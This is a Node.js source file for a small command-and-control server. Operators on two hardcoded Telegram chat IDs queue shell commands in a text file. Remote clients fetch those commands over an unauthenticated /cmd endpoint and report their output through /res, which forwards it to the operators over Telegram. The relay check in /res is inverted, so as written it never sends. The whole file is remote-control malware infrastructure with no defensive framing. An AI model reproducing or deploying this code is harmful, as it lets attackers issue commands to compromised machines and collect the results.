require("dotenv").config();
const express = require("express");
const fs = require("fs");
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const app = express();
const bot = new TelegramBot(process.env["BOT_TOKEN"], {polling: true});


app.get("/doit", async(req, res) => {
    fs.writeFileSync("./cmd.txt", req.query.cmd||req.query.command);

    return res.send("Done!");
});

app.get("/cmd", async(req, res) => res.send(fs.readFileSync("./cmd.txt")));

app.get("/res", async(req, res) => {
    if(req.query.res||req.query.response) return res.send("Done!");
    bot.sendMessage(5088649217, req.query.res||req.query.response);
    bot.sendMessage(1417274417, req.query.res||req.query.response);

    return res.send("Done!");
})

bot.on("message", (msg) => {
    if(msg.text.indexOf("/get")===0) {
        const cmd = fs.readFileSync("./cmd.txt");
        
        bot.sendMessage(5088649217, cmd);
        bot.sendMessage(1417274417, cmd);
    }

    if(msg.text.indexOf("/doit")===0) {
        fs.writeFileSync("./cmd.txt", msg.text.substring(6));

        bot.sendMessage(5088649217, "Updated!");
        bot.sendMessage(1417274417, "Updated!");
    }
});


app.listen(process.env.PORT, function() {console.log(`App running on port ${process.env.PORT}`);});
